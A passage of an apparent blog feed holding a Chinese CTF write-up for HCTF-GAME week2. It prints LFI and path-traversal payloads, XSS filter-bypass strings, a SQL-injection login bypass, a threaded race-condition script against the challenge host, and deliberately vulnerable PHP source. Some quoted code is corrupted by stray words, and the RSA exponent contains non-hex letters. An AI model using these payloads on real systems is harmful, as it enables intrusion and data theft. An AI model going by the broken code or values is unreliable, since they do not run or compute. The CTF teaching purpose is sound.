class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;从0开始之SQLI之0&quot;&gt;&lt;a href=&quot;#从0开始之SQLI之0&quot; class=&quot;headerlink&quot; title=&quot;从0开始之SQLI之0&quot;&gt;&lt;/a&gt;从0开始之SQLI之0&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;题目描述： &lt;a href=&quot;http:/
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://heartsky.info/tags/CTF/"/>
    
      <category term="wirteup" scheme="http://heartsky.info/tags/wirteup/"/>
    
  </entry>
  
  <entry>
    <title>HCTF-GAME week2 writeup</title>
    <link href="http://heartsky.info/2017/01/27/HCTF-GAME-week2-writeup/"/>
    <id>http://heartsky.info/2017/01/27/HCTF-GAME-week2-writeup/</id>
    <published>2017-01-27T13:50:28.000Z</published>
    <updated>2017-11-15T06:18:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="从0开始LFI之0"><a href="#从0开始LFI之0" class="headerlink" title="从0开始LFI之0"></a>从0开始LFI之0</h3><blockquote><p>题目描述： 送分题 flag在../flag.php<br><a href="http://119.29.138.57:12000/" target="_blank" rel="external">http://119.29.138.57:12000/</a></p></blockquote><p>没啥好说的，只是为了说下文件包含这个概念</p><h3 id="从0开始LFI之1"><a href="#从0开始LFI之1" class="headerlink" title="从0开始LFI之1"></a>从0开始LFI之1</h3><blockquote><p>题目描述： flag在哪呢?<br><a href="http://119.29.138.57:12001/" target="_blank" rel="external">http://119.29.138.57:12001/</a></p></blockquote><p>是接着上一道题的，当包含 <code>../flag.php</code>，得到提示 flag 不在这，f12 看一下，说是在注释里，既然不在 HTML 注释里，那就在 PHP 注释里了呗。接下来只要利用 PHP 伪协议读取文件就可以了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show.php?file=php://filter/read=convert.base64-encode/resource=../flag.php</span><br></pre></td></tr></table></figure></p><p>参考文档 : <a href="http://php.net/manual/zh/wrappers.php.php" target="_blank" rel="external">http://php.net/manual/zh/wrappers.php.php</a></p><h3 id="Explorer的图包"><a href="#Explorer的图包" class="headerlink" title="Explorer的图包"></a>Explorer的图包</h3><blockquote><p>题目描述： LoRexxar一直念念不忘Explorer的图包，一气之下Explorer把图放在了服务器上，当LoRexxar又需要的时候可以自己去下。<br>115.28.78.16:13333/6841a43503c4a909484566cdc2850fce/<br>Hint: 1、基本的盲测是发掘漏洞的基本手段<br>2、网站总有一些页面不希望网络爬虫获得</p></blockquote><p>刚开始 binwalk 跑了下有东西，提取出来是本身，以为是循环拆图片 = =<br>后来给了提示之后就很明白了，看下 robots.txt，得到 flag 文件位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /fl1l11l1ag.php</span><br></pre></td></tr></table></figure></p><p>剩下的就是一个很简单的盲测了，抓包可发现只有一个文件下载功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=explorer.jpg</span><br></pre></td></tr></table></figure></p><p>随手试了下找到了图片的位置 <code>images/explorer.jpg</code>，尝试修改为 flag 文件的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=../fl1l11l1ag.php</span><br></pre></td></tr></table></figure></p><p>发现返回的是默认的页面，猜想可能有过滤，回到图片那里，测试了下这几个返回的都是图片<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?f=./explorer.jpg</span><br><span class="line">?f=../explorer.jpg</span><br></pre></td></tr></table></figure></p><p>当再加一个 <code>.</code> 时就又返回了默认页面，结合响应头里的 filename 变成了 <code>.explorer.jpg</code>，这不就很明显是把 <code>../</code> 替换成空格了吗，绕过也简单，双写就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=....//fl1l11l1ag.php</span><br></pre></td></tr></table></figure></p><p>顺便读一下源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">'f'</span>]))&#123;</span><br><span class="line">$filename = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $_GET[<span class="string">'f'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(substr($filename, <span class="number">0</span>, <span class="number">1</span>) === <span class="string">'/'</span>) <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-disposition: attachment; filename='</span>.basename($filename));</span><br><span class="line">$filename = <span class="string">'./images/'</span>.$filename;</span><br><span class="line"></span><br><span class="line">readfile($filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> you want explorer<span class="string">'s gallery?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;a href="./index.php?f=explorer.jpg" &gt;click me&lt;/a&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="从0开始之XSS-challenge0"><a href="#从0开始之XSS-challenge0" class="headerlink" title="从0开始之XSS challenge0"></a>从0开始之XSS challenge0</h3><blockquote><p>题目描述： <a href="http://123.206.199.184/xss/0x00/" target="_blank" rel="external">http://123.206.199.184/xss/0x00/</a></p></blockquote><p>只把 <code>script</code> 替换成了空格，n 种方式可以弹窗，给出几个 payload<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="从0开始之XSS-challenge1"><a href="#从0开始之XSS-challenge1" class="headerlink" title="从0开始之XSS challenge1"></a>从0开始之XSS challenge1</h3><blockquote><p>题目描述： <a href="http://123.206.199.184/xss/0x01/" target="_blank" rel="external">http://123.206.199.184/xss/0x01/</a></p></blockquote><p>过滤了这些<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">script</span><br><span class="line">img</span><br><span class="line">&gt;</span><br><span class="line">(</span><br></pre></td></tr></table></figure></p><p>依然可以绕过<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">" type=image src=1 onerror="alert`1`</span><br><span class="line">" type=image src=1 onerror=alert&amp;#40;1) "</span><br><span class="line">" autofocus onfocus="alert&amp;#40;1)</span><br><span class="line">" type=image onerror=eval&amp;#40;atob&amp;#40;'YWxlcnQoMSk=')) src="1</span><br><span class="line">" type=image src=1 onerror=eval.call`$&#123;'alert\x281)'&#125;` "</span><br></pre></td></tr></table></figure></p><p>涉及以下知识点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input 标签中只有第一个 type 会生效</span><br><span class="line">标签属性值中的 HTML 编码会被自动解码</span><br></pre></td></tr></table></figure></p><h3 id="从0开始之XSS-challenge2"><a href="#从0开始之XSS-challenge2" class="headerlink" title="从0开始之XSS challenge2"></a>从0开始之XSS challenge2</h3><blockquote><p>题目描述： <a href="http://123.206.199.184/xss/0x02/" target="_blank" rel="external">http://123.206.199.184/xss/0x02/</a></p></blockquote><p>过滤了这些<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">"</span><br><span class="line">/</span><br></pre></td></tr></table></figure></p><p>但输出是在 svg 标签内的，在 svg 向量里面，会先进行 xml 解析，所以可构造如下 payload<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#34;;alert(1);&amp;#34;</span><br><span class="line">&amp;quot;;alert(1)&amp;#47;&amp;#47;</span><br></pre></td></tr></table></figure></p><h2 id="PWNTEST"><a href="#PWNTEST" class="headerlink" title="PWNTEST"></a>PWNTEST</h2><h3 id="我是最简单的渗透题"><a href="#我是最简单的渗透题" class="headerlink" title="我是最简单的渗透题"></a>我是最简单的渗透题</h3><blockquote><p>题目描述： <a href="http://115.28.78.16:13333/pentest/0x01/" target="_blank" rel="external">http://115.28.78.16:13333/pentest/0x01/</a></p></blockquote><p>打开网站后只有一个登录框，其他的什么也没有，大概就是 SQL 注入了，模糊测试后得到绕过方式<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>||<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>查询语句大概这样<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query1 = <span class="string">"SELECT * FROM xxx WHERE username = $username and password = $password"</span>;</span><br></pre></td></tr></table></figure></p><h3 id="ez-game"><a href="#ez-game" class="headerlink" title="ez game"></a>ez game</h3><blockquote><p>题目描述： aklis正在线上debug的时候，LoRexxar拔了他的网线，于是…<br><a href="http://115.28.78.16:13333/3a94a786f2f3af094a461b295bc4e2f6/" target="_blank" rel="external">http://115.28.78.16:13333/3a94a786f2f3af094a461b295bc4e2f6/</a></p></blockquote><p>由描述可知应该是备份文件泄露问题，搜下常见的备份文件试一下就知道了，不过开始时 403 了，后来才可以正常下载。这里是 vim 在编辑时的缓冲区备份文件 <code>.*.swp</code>，如果在编辑过程中电脑断电或 vim 发生异常就可以从这个文件恢复<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r .*.swp</span><br></pre></td></tr></table></figure></p><p>然后就得到了 <code>register.php</code> 和 <code>login.php</code> 的源码</p><h5 id="register-php"><a href="#register-php" class="headerlink" title="register.php"></a>register.php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> ($_POST[<span class="string">'username'</span>]===<span class="string">''</span> || $_POST[<span class="string">'password'</span>]===<span class="string">''</span> || $_POST[<span class="string">'gogogo'</span>]!==<span class="string">'苟!'</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"something error..."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $mysqli = <span class="keyword">new</span> mysqli(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ($mysqli-&gt;connect_errno) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"gg"</span>.$mysqli-&gt;error);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $username = $mysqli-&gt;escape_string($_POST[<span class="string">'username'</span>]);</span><br><span class="line">  $password = sha1($_POST[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($result = $mysqli-&gt;query(<span class="string">"select * from users where username='$username'"</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows) &#123;</span><br><span class="line">      $result-&gt;close();de</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">"username is exist"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $query = <span class="string">"insert into users (id, username, password) values (NULL , '$username', '$password')"</span>;</span><br><span class="line">  <span class="keyword">if</span> ($mysqli-&gt;query($query) !== <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'gg...'</span>.$mysqli-&gt;error);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $query = <span class="string">"select * from users where username = '$username'"</span>;</span><br><span class="line">  $result = $mysqli-&gt;query($query);</span><br><span class="line">  <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">    $row = $result-&gt;fetch_array();</span><br><span class="line">    $uid = $row[<span class="string">'id'</span>];</span><br><span class="line">    $query = <span class="string">"insert into role (id, uid, level) values (NULL, $uid, 0)"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($mysqli-&gt;query($query) === <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">"success"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">exit</span> (<span class="string">"Oh! No!"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">  header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> ($_POST[<span class="string">'username'</span>]===<span class="string">''</span> || $_POST[<span class="string">'password'</span>]===<span class="string">''</span> || $_POST[<span class="string">'gogogo'</span>]!==<span class="string">'苟!'</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"something error..."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $ocode = intval(trim($_POST[<span class="string">'code'</span>]));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  $mysqli = <span class="keyword">new</span> mysqli(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ($mysqli-&gt;connect_errno) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"gg"</span>.$mysqli-&gt;error);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $username = $mysqli-&gt;escape_string($_POST[<span class="string">'username'</span>]);</span><br><span class="line">  $password = sha1($_POST[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">  $query = <span class="string">"select * from users where username='$username' and password='$password'"</span>;</span><br><span class="line"></span><br><span class="line">  $result = $mysqli-&gt;query($query);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">    $row = $result-&gt;fetch_array();</span><br><span class="line">    $_SESSION[<span class="string">'id'</span>] = $row[<span class="string">'id'</span>];</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $row[<span class="string">'username'</span>];</span><br><span class="line">    $query = <span class="string">"select * from role where uid = $_SESSION[id]"</span>;</span><br><span class="line">    $res = $mysqli-&gt;query($query); </span><br><span class="line">    $row = $res ? $res-&gt;fetch_array() : <span class="keyword">array</span>();</span><br><span class="line">    $_SESSION[<span class="string">'level'</span>] = $row[<span class="string">'level'</span>];</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);kanxia</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"Wrong username or password..."</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以看到 register.php 里第 35 行，用户注册后不仅向 users 表添加了记录，还向 role 表添加了 level 为 0 的记录，虽然暂时不知道干啥的，但出现了肯定是有意义的，再去看下 login.php，第 36 行对 role 表进行了查询，并取出了当前用户的 level，差不多就是这样，然后再去注册登录试下，发现每次登上去都是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you are just guest, you can&apos;t touch flag!</span><br></pre></td></tr></table></figure></p><p>再与源码中出现的 level 相联系，可能是判断的 level，注入是不可能了，我们再看下源码中 level 出现的地方，可以发现用户注册后 level 便被设置为 0，猜测判断代码是这样<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($level === <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"you are just guest, you can't touch flag!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>那么我们的目标就是让 level 不为 0 了，看下 login.php 里的与 level 有关的部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select * from role where uid = $_SESSION[id]"</span>;</span><br><span class="line">$res = $mysqli-&gt;query($query); </span><br><span class="line">$row = $res ? $res-&gt;fetch_array() : <span class="keyword">array</span>();</span><br><span class="line">$_SESSION[<span class="string">'level'</span>] = $row[<span class="string">'level'</span>];</span><br></pre></td></tr></table></figure></p><p>看起来好像没什么问题，但第三行，如果表中没有这条记录，便会跳到 array()，那 level 就是 NULL ，这样就能拿到 flag 了。这里就是条件竞争了，大致就是用多个线程同时模拟注册和登录请求，总会有一次在向 role 表添加记录之前完成登陆，附上脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(data)</span>:</span></span><br><span class="line">    r = requests.post(url = <span class="string">"http://115.28.78.16:13333/3a94a786f2f3af094a461b295bc4e2f6/register.php"</span>,data = data)</span><br><span class="line">    <span class="comment"># print r.text</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(data)</span>:</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    r = s.post(url = <span class="string">"http://115.28.78.16:13333/3a94a786f2f3af094a461b295bc4e2f6/login.php"</span>,data = data)</span><br><span class="line">    r = s.get(url = <span class="string">"http://115.28.78.16:13333/3a94a786f2f3af094a461b295bc4e2f6/index.php"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"hctf"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="comment"># a = "o2a2l1l5a9" + str(i).zfill(3)</span></span><br><span class="line">    a = <span class="string">'aaO0qzxPak'</span> + str(i)</span><br><span class="line">    data = &#123;<span class="string">'username'</span>:a,<span class="string">'password'</span>:a,<span class="string">'gogogo'</span>:<span class="string">'苟!'</span>&#125;</span><br><span class="line"></span><br><span class="line">    threading.Thread(target = register,args = (data,)).start()</span><br><span class="line">    <span class="comment"># time.sleep(0.072)</span></span><br><span class="line">    threading.Thread(target = login,args = (data,)).start()</span><br></pre></td></tr></table></figure></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="explore的奇怪番外2"><a href="#explore的奇怪番外2" class="headerlink" title="explore的奇怪番外2"></a>explore的奇怪番外2</h3><blockquote><p>题目描述： <a href="http://121.42.25.113/io2/io2.html" target="_blank" rel="external">http://121.42.25.113/io2/io2.html</a></p></blockquote><p>连上去之后得到题目要求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Plz give me some data</span><br><span class="line">The data&apos;s len is 100</span><br><span class="line">The data&apos;s sha256 must start with 5b e0 bc</span><br></pre></td></tr></table></figure></p><p>sha256 加密后开头的值是会变化的，只要做过番外 1，知道了怎么写 socket，这题也差不多难度吧(先跑出来手动提交也可以<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ipPort = (<span class="string">'121.42.25.113'</span>,<span class="number">20001</span>)</span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.connect(ipPort)</span><br><span class="line">mes = sk.recv(<span class="number">1024</span>)</span><br><span class="line">mes = sk.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">pat = <span class="string">'with.*'</span></span><br><span class="line">mes = re.search(pat,mes).group(<span class="number">0</span>)[<span class="number">5</span>:].split(<span class="string">' '</span>)</span><br><span class="line">start = <span class="string">''</span>.join(mes)</span><br><span class="line"><span class="keyword">print</span> start</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    s = <span class="string">''</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>))</span><br><span class="line">    hash = hashlib.sha256(s).hexdigest()</span><br><span class="line">    <span class="keyword">print</span> hash[:<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">if</span> hash[:<span class="number">6</span>] == start:</span><br><span class="line">      sk.sendall(s + <span class="string">'\n'</span>)</span><br><span class="line">      mes = sk.recv(<span class="number">1024</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag is '</span> + mes</span><br><span class="line">sk.close()</span><br></pre></td></tr></table></figure></p><p>看运气的题目 233</p><h3 id="我是一个有格调的misc题目"><a href="#我是一个有格调的misc题目" class="headerlink" title="我是一个有格调的misc题目"></a>我是一个有格调的misc题目</h3><blockquote><p>题目描述：<br>链接：<a href="http://pan.baidu.com/s/1o8wJuGU" target="_blank" rel="external">http://pan.baidu.com/s/1o8wJuGU</a> 密码：pewf</p></blockquote><p>flag 在请求 url 里，搜下就有了</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="密码学教室进阶（五）"><a href="#密码学教室进阶（五）" class="headerlink" title="密码学教室进阶（五）"></a>密码学教室进阶（五）</h3><blockquote><p>题目描述： n=0xee290c7a603fc23300eb3f0e5868d056b7deb1af33b5112a6da1edc9612c5eeb4ab07d838a3b4397d8e6b6844065d98543a977ed40ccd8f57ac5bc2daee2dec301aac508f9befc27fae4a2665e82f13b1ddd17d3a0c85740bed8d53eeda665a5fc1bed35fbbcedd4279d04aa747ac1f996f724b14f0228366aeae34305152e1f430221f9594497686c9f49021d833144962c2a53dbb47bdbfd19785ad8da6e7b59be24d34ed201384d3b0f34267df4ba8b53f0f4481f9bd2e26c4a3e95cd1a47f806a1f16b86a9fc5e8a0756898f63f5c9144f51b401ba0dd5ad58fb0e97ebac9a41dc3fb4a378707f7210e64c131bca19bd54e39bbfa0d7a0e7c89d955b1c9fL<br>e=0xe438fddb77f9bc2cf97185041e8a5ce8d0853cbfb657b940505870f0d3dfc0b723c5f7c8c9b940769f358397e275d00cce1cf760f9892a4b83ff90cbe513c6cc450258d02bcee33e499fb028c2b0d811bba22ef0c4fea314018d4943451ecdeb5d6e98bd5ed71ab7862a747f851c532aeae6c29f52c3f9be649a4142810ddb83015386fd035fcdc28059236135a9cce24fd650062067dcf43f5dcf24e15f132e9dca4ff68cc76jiuyoulejiuyoule37139dbdba276157f11e8af118d8dfae3f811a0377ba37555f9L<br>c=0xbe864c22e69bd872541b7538b3c9797cf76afa2b2cac70c5a1a47fb6b6046daf345946d6e0eb299d12a7485ad9edaced28ef0b3169a22d1cba69c1e556ed2a69b6eca7e030f8cf61616faff4e063caf1a0668d4357594e7ff8887f00f61df5161e94f2197abcc2d34db666a34fa9e0f108c7937dc09b8e091ba2a4180f88f1b58229891bd619025f2c13f5758d7f4f6ac8f4d3f565449a730fef9ecee37f5409b801b554a30cfb42f69afc734b7709c5df6618e94e96b5d24a4b63c